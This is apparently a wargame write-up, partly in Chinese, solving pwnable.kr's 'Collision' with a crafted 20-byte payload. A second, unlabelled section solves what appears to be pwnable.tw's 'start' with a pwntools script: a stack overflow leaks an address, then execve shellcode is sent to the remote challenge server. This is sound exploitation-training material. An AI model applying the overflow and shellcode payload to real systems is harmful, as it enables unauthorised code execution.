[pwnable.kr] Collision

Aug 27th, 2018 10:16 am


col@ubuntu:~$ cat col.c
#include <stdio.h>
#include <string.h>
unsigned long hashcode = 0x21DD09EC;
unsigned long check_password(const char* p){
        int* ip = (int*)p;
        int i;
        int res=0;
        for(i=0; i<5; i++){
                res += ip[i];
        }
        return res;
}

int main(int argc, char* argv[]){
        if(argc<2){
                printf("usage : %s [passcode]\n", argv[0]);
                return 0;
        }
        if(strlen(argv[1]) != 20){
                printf("passcode length should be 20 bytes\n");
                return 0;
        }

        if(hashcode == check_password( argv[1] )){
                system("/bin/cat flag");
                return 0;
        }
        else
                printf("wrong passcode.\n");
        return 0;
}

---
輸入五個int總合是0x21DD09EC
長度判斷是strlen
所以不能有byte是\x00
因此用四個0x01010101加上剩下即可
另外要注意的點是little endian
col@ubuntu:~$ ./col $(python -c "print '\x01'*16+'\xe8\x05\xd9\x1d'")
daddy! I just managed to create a hash collision :)

---

一開始的就把ebp push到stack上
所以整個start執行完時stack頂端就是ebp的值

start結尾是esp加20後就return
所以輸入超過20的話就可以淹到返回位置

把返回位置淹成0x08048087
剛剛好把ebp設成write system call的參數ecx
所以可以把stack address印出來

而且stack是可執行的
因此寫入shellcode再把返回位置改成shellcode即可



from pwn import *
#r = process('./start')
r = remote('chall.pwnable.tw',10000)
r.send('a'*20+p32(0x08048087))
r.recvuntil('CTF:')
stack_addr = u32(r.recv(4))
print 'stack addr = ',hex(stack_addr)
shellcode = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"
r.send('a'*20+p32(stack_addr+20)+shellcode)
r.interactive()
